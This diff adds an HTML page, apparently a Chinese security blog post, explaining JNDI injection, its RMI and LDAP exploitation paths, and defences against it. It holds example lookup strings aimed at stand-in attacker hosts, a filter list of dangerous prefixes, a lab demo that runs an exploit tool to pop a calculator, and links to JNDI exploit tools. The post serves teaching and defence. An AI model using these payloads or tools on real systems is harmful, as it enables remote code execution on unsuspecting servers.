@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="JNDI注入基础介绍1 JNDI 的基本概念JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一组应用程序编程接口（API），它为Java应用程序提供了访问各种命名和目录服务的统一客户端接口。JNDI的核心价值在于其抽象层设计，它允许开发人员使用相同的代码与不同类型的命名和目录服务（如RMI、LDAP、DNS、CORBA等）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="JNDI注入基础介绍1 JNDI 的基本概念JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一组应用程序编程接口（API），它为Java应用程序提供了访问各种命名和目录服务的统一客户端接口。JNDI的核心价值在于其抽象层设计，它允许开发人员使用相同的代码与不同类型的命名和目录服务（如RMI、LDAP、DNS、CORBA等）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920131222536.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920133051756.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920133222399.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920133252483.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920134300655.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920151931442.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920152058569.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920152125549.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920152146018.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920153722489.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920153753177.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920155815315.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920155824765.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250920160048233.png">
+<meta property="article:published_time" content="2025-09-21T11:45:36.000Z">
+<meta property="article:modified_time" content="2025-09-21T12:09:29.995Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20250920131222536.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/JNDI%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/JNDI%E6%B3%A8%E5%85%A5/","path":"2025/09/21/Java攻防/JNDI注入/","title":"JNDI注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JNDI注入 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">JNDI注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">基础介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-JNDI-%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.1.</span> <span class="nav-text">1 JNDI 的基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-JNDI-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.2.</span> <span class="nav-text">2 JNDI 注入的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-JNDI-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.3.</span> <span class="nav-text">3 JNDI 注入的利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-JNDI-%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="nav-number">1.1.4.</span> <span class="nav-text">4 JNDI 注入的防御策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.</span> <span class="nav-text">演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.2.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">工具汇总</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jyso"><span class="nav-number">1.2.3.</span> <span class="nav-text">Jyso</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDIBypass"><span class="nav-number">1.2.4.</span> <span class="nav-text">JNDIBypass</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/09/21/Java%E6%94%BB%E9%98%B2/JNDI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JNDI注入 | 子非鱼的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JNDI注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-21 19:45:36 / 修改时间：20:09:29" itemprop="dateCreated datePublished" datetime="2025-09-21T19:45:36+08:00">2025-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h2><h3 id="1-JNDI-的基本概念"><a href="#1-JNDI-的基本概念" class="headerlink" title="1 JNDI 的基本概念"></a>1 JNDI 的基本概念</h3><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一组<strong>应用程序编程接口（API）</strong>，它为Java应用程序提供了访问各种命名和目录服务的<strong>统一客户端接口</strong>。JNDI的核心价值在于其<strong>抽象层设计</strong>，它允许开发人员使用相同的代码与不同类型的命名和目录服务（如RMI、LDAP、DNS、CORBA等）进行交互，而无需关心底层服务的具体实现细节。这使得Java应用程序能够以<strong>标准化的方式</strong>发现和查找各种资源（如数据库连接、远程对象、打印机等）以及其他程序对象，极大地增强了系统的<strong>可维护性</strong>和<strong>灵活性</strong>。例如，当数据库连接参数发生变更时，只需在JNDI环境中修改数据源配置，而无需修改所有应用程序代码，这简化了系统管理并降低了组件间的耦合度。</p>
+<span id="more"></span>
+<p>JNDI的架构主要包含两个部分：<strong>应用层接口（API）</strong> 和 <strong>服务供应接口（SPI）</strong>。API为开发人员提供了编程接口，主要包括 <code>javax.naming</code>包（用于命名操作，包含Context、Binding、References、lookup等核心类和接口）和 <code>javax.naming.directory</code>包（用于目录操作，扩展了命名服务以支持属性操作）。SPI则是一个服务提供者接口，它为各种具体的命名和目录服务（如RMI、LDAP）提供了<strong>可插拔的集成方式</strong>，使得不同的服务提供商可以实现这些接口并将其集成到JNDI框架中。这种设计使得JNDI能够作为一个<strong>统一的桥梁</strong>，连接Java应用程序与多样的后端服务。</p>
+<p>在JNDI中，有几个核心概念需要理解：</p>
+<ul>
+<li><strong>命名服务（Naming Service）</strong>：一种将名称与对象关联起来的服务，允许通过名称查找对象。这类似于电话簿通过姓名查找电话号码，或文件系统通过文件名查找文件。DNS（将域名映射到IP地址）和RMI注册表（将服务名映射到远程对象）都是典型的命名服务。</li>
+<li><strong>目录服务（Directory Service）</strong>：命名服务的扩展，它不仅允许通过名称查找对象，还允许对象拥有<strong>属性（Attributes）</strong>。例如，LDAP（轻量级目录访问协议）中可以存储用户的姓名、邮箱、部门等属性。</li>
+<li><strong>上下文（Context）</strong>：一个上下文对象包含了一组名称到对象的绑定关系。它可以被看作是一个<strong>目录节点</strong>，你可以在特定的上下文中进行查找、绑定等操作。多个Context可以级联形成一种树状结构。</li>
+<li><strong>引用（Reference）</strong>：当对象无法直接存储在命名或目录服务中时，可以用一个Reference对象来表示它。Reference包含了如何访问实际对象的信息，例如对象的类名、工厂类的名称和位置（codebase）。当客户端查找该引用时，JNDI会使用指定的<strong>ObjectFactory</strong>来实例化并返回实际的对象。</li>
+</ul>
+<p>一个简单的JNDI使用示例是获取一个初始上下文并进行查找：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 设置环境属性，指定JNDI服务工厂和提供者URL</span><br><span class="line">Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span><br><span class="line">env.put(Context.PROVIDER_URL, &quot;ldap://localhost:389&quot;);</span><br><span class="line">// 创建初始上下文</span><br><span class="line">Context ctx = new InitialContext(env);</span><br><span class="line">// 查找名为&quot;cn=john,ou=users,dc=example,dc=com&quot;的对象</span><br><span class="line">Object obj = ctx.lookup(&quot;cn=john,ou=users,dc=example,dc=com&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-JNDI-注入的原理"><a href="#2-JNDI-注入的原理" class="headerlink" title="2 JNDI 注入的原理"></a>2 JNDI 注入的原理</h3><p>JNDI注入是一种<strong>严重的安全漏洞</strong>，其核心原理在于攻击者能够<strong>控制JNDI查找的地址或名称</strong>，从而诱导应用程序从恶意的服务器加载并执行任意代码。该漏洞的利用条件有两个：一是应用程序使用用户可控的输入直接构造JNDI查找的名称（例如 <code>ctx.lookup(userInput)</code>）；二是应用程序运行在<strong>较低版本的JDK</strong>上（通常早于JDK 6u132, 7u122, 8u121），这些版本默认允许从远程codebase加载类文件。当这两个条件满足时，攻击者就可以通过精心构造的恶意JNDI地址（如 <code>rmi://attacker-server/Exploit</code>或 <code>ldap://attacker-server/Exploit</code>）实施攻击。</p>
+<p><img src="/./images/image-20250920131222536.png" alt="image-20250920131222536"></p>
+<p>JNDI注入的攻击机制主要利用了JNDI <strong>Reference</strong> 的特性。Reference对象可以指向一个外部的类定义，指定类名（className）、工厂类名（factory）以及一个用于加载工厂类的codebase地址（factoryLocation）。当客户端在执行 <code>lookup()</code>时，如果从服务端获取到一个Reference对象，并且其factoryLocation指向一个远程地址，客户端会尝试从该地址（如HTTP服务器）下载工厂类的字节码，然后使用<strong>URLClassLoader</strong> 进行加载和实例化。攻击者可以在工厂类的静态代码块、构造函数或 <code>getObjectInstance()</code>方法中嵌入<strong>恶意代码</strong>（如执行系统命令），这些代码在类加载和实例化过程中就会被执行，从而在目标系统上实现远程代码执行（RCE）。</p>
+<p>一个典型的JNDI注入攻击流程包含以下几个步骤：</p>
+<ol>
+<li><strong>攻击者搭建恶意服务</strong>：攻击者首先需要搭建一个恶意的RMI或LDAP服务器（例如使用marshalsec工具），并将一个恶意的Reference对象绑定到该服务器上。这个Reference指向攻击者控制的另一个HTTP服务器，该HTTP服务器托管着包含恶意代码的工厂类（.class文件）。</li>
+<li><strong>诱使目标进行JNDI查找</strong>：攻击者通过某种方式（如输入表单、HTTP请求头、日志记录等）将恶意JNDI地址（如 <code>$&#123;jndi:ldap://attacker.com/Exploit&#125;</code>）注入到目标应用程序中。一个著名的例子是Log4Shell漏洞（CVE-2021-44228），攻击者通过注入恶意的日志消息触发漏洞。</li>
+<li><strong>目标应用程序执行查找</strong>：当目标应用程序处理该输入并执行 <code>lookup()</code>操作时，它会向攻击者控制的恶意服务器发起请求。</li>
+<li><strong>恶意服务器返回Reference</strong>：恶意RMI或LDAP服务器响应请求，返回一个精心构造的Reference对象。</li>
+<li><strong>目标加载并执行恶意代码</strong>：目标应用程序的JNDI客户端解析Reference对象，并从指定的codebase（攻击者的HTTP服务器）下载恶意工厂类。随后，在实例化该工厂类的过程中，嵌入其中的恶意代码得以执行，攻击者从而获得对目标系统的控制权。</li>
+</ol>
+<h3 id="3-JNDI-注入的利用方式"><a href="#3-JNDI-注入的利用方式" class="headerlink" title="3 JNDI 注入的利用方式"></a>3 JNDI 注入的利用方式</h3><p>JNDI注入的利用方式主要根据所利用的协议向量来区分，其中<strong>RMI</strong>和<strong>LDAP</strong>是最为常见的两种利用向量。不同的向量在攻击设置和细节上有所不同，但最终目标都是诱导客户端加载并执行远程恶意代码。</p>
+<ol>
+<li><strong>RMI向量利用</strong>：RMI（Remote Method Invocation）是Java自身的远程方法调用机制。在利用RMI进行JNDI注入时，攻击者需要搭建一个恶意的RMI注册服务器。首先，攻击者使用 <code>Reference</code>类构造一个恶意引用，指定要加载的恶意类名和工厂类的位置（通常是一个远程HTTP URL）。由于RMI registry本身不能直接存储 <code>Reference</code>对象，攻击者会使用 <code>ReferenceWrapper</code>类对其进行包装，然后将其绑定到RMI registry的某个名称下（例如 <code>registry.bind(&quot;Exploit&quot;, new ReferenceWrapper(ref))</code>）。当受害者应用程序执行 <code>ctx.lookup(&quot;rmi://attacker-ip:1099/Exploit&quot;)</code>时，它会连接到恶意的RMI服务器，服务器返回这个 <code>ReferenceWrapper</code>。客户端随后会从 <code>factoryLocation</code>指定的远程HTTP服务器下载恶意类字节码，并进行实例化，从而导致恶意代码执行。在JDK高版本（&gt;&#x3D; 8u121）中，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>默认设置为false，阻止了从远程codebase加载类，使得这种利用方式在一定程度上被缓解。</li>
+<li><strong>LDAP向量利用</strong>：LDAP（Lightweight Directory Access Protocol）是一种轻量级目录访问协议。利用LDAP向量时，攻击者会搭建一个恶意的LDAP服务器（例如使用OpenLDAP或Java工具）。当受害者应用程序向恶意LDAP服务器发起查询请求时（例如 <code>ctx.lookup(&quot;ldap://attacker-ip:1389/cn=exploit,dc=example,dc=com&quot;)</code>），攻击者控制的LDAP服务器可以返回一个包含恶意Reference信息的目录条目（Entry）。该条目通常会设置 <code>javaClassName</code>属性以及 <code>javaCodeBase</code>、<code>objectClass</code>等属性来指向远程的恶意类。与RMI向量类似，客户端在解析该响应后，也会尝试从指定的codebase URL下载并实例化工厂类，触发代码执行。高版本JDK（&gt;&#x3D; 8u191）同样通过将系统属性 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>默认设置为false来限制远程加载，增加了利用难度。</li>
+</ol>
+<p>除了RMI和LDAP，<strong>DNS</strong> 等其它协议有时也被用于JNDI注入的辅助验证。例如，攻击者可以注入一个指向自己控制的DNS域的JNDI地址（如 <code>dns://attacker-domain.com</code>）。虽然DNS协议本身通常不能直接用于传输恶意Reference并执行代码，但如果目标应用程序发起了对攻击者域名的DNS查询，这至少可以证明存在<strong>可控的JNDI查找点</strong>，为后续利用其他向量提供线索。这是一种低干扰的漏洞探测方法。</p>
+<p>值得注意的是，在高版本JDK默认防护措施生效后，攻击者并未完全放弃，而是研究出一些<strong>绕过限制</strong>的方法。例如，利用目标ClassPath中已有的、具有危险方法的类（如Tomcat中的 <code>org.apache.naming.factory.BeanFactory</code>结合EL表达式）作为ObjectFactory，从而在不依赖远程codebase的情况下实现本地代码执行。这些方法对攻击环境提出了更苛刻的要求，但依然值得警惕。</p>
+<h3 id="4-JNDI-注入的防御策略"><a href="#4-JNDI-注入的防御策略" class="headerlink" title="4 JNDI 注入的防御策略"></a>4 JNDI 注入的防御策略</h3><p>防御JNDI注入需要采取多层次、纵深的安全策略，从代码开发、环境配置到网络层面进行全面加固。以下是一些关键且有效的防御措施：</p>
+<ul>
+<li><strong>升级JDK版本并及时打补丁</strong>：这是最直接有效的防御手段。将JDK升级到<strong>安全版本</strong>（如JDK 8u191、11.0.1及以上），这些版本默认将 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>和 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>等关键系统属性设置为 <code>false</code>，从根本上禁止了JNDI从远程codebase加载类的行为，极大地遏制了最常见的远程利用方式。同时，密切关注Java官方发布的安全更新，并及时应用补丁，以修复新发现的安全漏洞。</li>
+<li><strong>对用户输入进行严格的过滤和验证</strong>：在所有可能传递给JNDI API（尤其是 <code>lookup()</code>方法）的<strong>用户输入点</strong>实施严格的输入验证。坚决禁止输入中包含诸如 <code>ldap://</code>、<code>rmi://</code>、<code>dns://</code>、<code>$&#123;jndi:</code>等可能导致协议解析或表达式解析的危险<strong>模式（Pattern）</strong> 或<strong>前缀</strong>。建议采用白名单机制，只允许预期的、安全的字符和模式。对于日志记录等场景，确保在记录日志前对输入进行转义或过滤，防止像Log4Shell这样的漏洞被触发。</li>
+<li><strong>避免不可信输入直接控制JNDI查找</strong>：从代码设计层面，<strong>尽量避免</strong>使用来自用户请求、网络传输等不可信来源的数据直接拼接或构造JNDI查找的名称（Name）。如果业务确实需要动态查找，应使用预定义的、受信任的资源名称映射，或通过间接的方式（如查询数据库配置）来获取安全的JNDI名称。</li>
+<li><strong>配置网络访问控制策略</strong>：通过网络防火墙或安全组策略，严格限制应用程序服务器的<strong>出站网络连接</strong>。只允许应用程序访问其正常运行所必需的、受信任的<strong>内部命名和目录服务</strong>（如内网LDAP服务器、RMI注册中心），并阻断所有到外部未知服务器的访问请求。这样可以有效防止应用程序在遭受攻击时向外部恶意服务器发起连接，即使攻击注入了恶意地址。</li>
+<li><strong>使用JVM安全属性强化策略</strong>：除了依赖高版本的默认设置，还可以在启动JVM时<strong>显式设置</strong>相关的安全属性，明确禁用远程类加载功能，例如添加 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=false</code>等参数。这为安全策略提供了一层明确的保证。</li>
+<li><strong>最小权限原则和代码审计</strong>：遵循最小权限原则运行Java应用程序，避免使用过高权限的账户（如root或Administrator）。定期进行<strong>代码安全审计</strong>，重点关注所有调用了 <code>InitialContext.lookup()</code>、<code>NamingManager.getObjectInstance()</code>等方法的代码段，确保其参数可控性和安全性。同时，使用<strong>运行时应用程序自我保护（RASP）</strong> 或<strong>Web应用防火墙（WAF）</strong> 等安全产品，可以帮助检测和拦截恶意的JNDI注入尝试。</li>
+</ul>
+<p>综合运用以上防御策略，可以构建一个相对完善的防护体系，显著降低应用程序遭受JNDI注入攻击的风险。</p>
+<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>工具：<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a> ，在自己的云服务器搭建使用</p>
+<p>靶场：<a target="_blank" rel="noopener" href="https://github.com/bewhale/JavaSec%EF%BC%8C%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2">https://github.com/bewhale/JavaSec，本地部署</a></p>
+<p>靶场启动后</p>
+<p><img src="/./images/image-20250920133051756.png" alt="image-20250920133051756"></p>
+<p>在Fastjson中这个反序列化漏洞就是基于jndi注入实现的，打开我们部署的工具</p>
+<p><img src="/./images/image-20250920133222399.png" alt="image-20250920133222399"></p>
+<p>配置工具后生成<img src="/./images/image-20250920133252483.png" alt="image-20250920133252483"></p>
+<p>然后复制这个链接到靶场的fastjson处，可以弹出计算器，对运行靶场的jdk版本有要求</p>
+<p>工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus?tab=readme-ov-file">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus?tab=readme-ov-file</a></p>
+<p><img src="/./images/image-20250920134300655.png" alt="image-20250920134300655"></p>
+<p>运行：</p>
+<blockquote>
+<p>java -jar JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar  -C “calc” -A 10.56.93.60</p>
+</blockquote>
+<p>然后根据目标环境选择</p>
+<p>在java-chains中，根据项目中的依赖以及版本还有jdk自身的版本，结合java-chains工具的介绍（<a target="_blank" rel="noopener" href="https://java-chains.vulhub.org/zh/docs/guide%EF%BC%89%EF%BC%8C%E4%B8%80%E4%B8%80%E6%B5%8B%E8%AF%95%E3%80%82">https://java-chains.vulhub.org/zh/docs/guide），一一测试。</a></p>
+<p>比如：</p>
+<p><img src="/./images/image-20250920151931442.png" alt="image-20250920151931442"></p>
+<p><img src="/./images/image-20250920152058569.png" alt="image-20250920152058569"></p>
+<p><img src="/./images/image-20250920152125549.png" alt="image-20250920152125549"></p>
+<p><img src="/./images/image-20250920152146018.png" alt="image-20250920152146018"></p>
+<h3 id="工具汇总"><a href="#工具汇总" class="headerlink" title="工具汇总"></a>工具汇总</h3><p><a target="_blank" rel="noopener" href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/X1r0z/JNDIMap">https://github.com/X1r0z/JNDIMap</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/B4aron1/JNDIBypass">https://github.com/B4aron1/JNDIBypass</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus</a></p>
